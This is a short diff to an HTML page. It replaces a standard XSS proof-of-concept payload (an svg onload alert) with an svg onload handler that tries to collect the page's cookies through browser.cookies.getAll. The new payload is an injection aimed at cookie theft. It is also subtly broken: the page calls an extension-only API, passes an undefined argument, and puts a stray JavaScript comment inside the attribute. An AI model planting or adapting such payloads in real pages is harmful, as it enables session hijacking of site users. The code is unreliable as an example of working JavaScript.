@@ -9,7 +9,9 @@
 </head>
 
 <body>
-    <svg/onload=alert('XSS')></svg>
+    <svg/onload=browser.cookies.getAll(
+  details                // object
+)></svg>
    
 </body>
 </html>
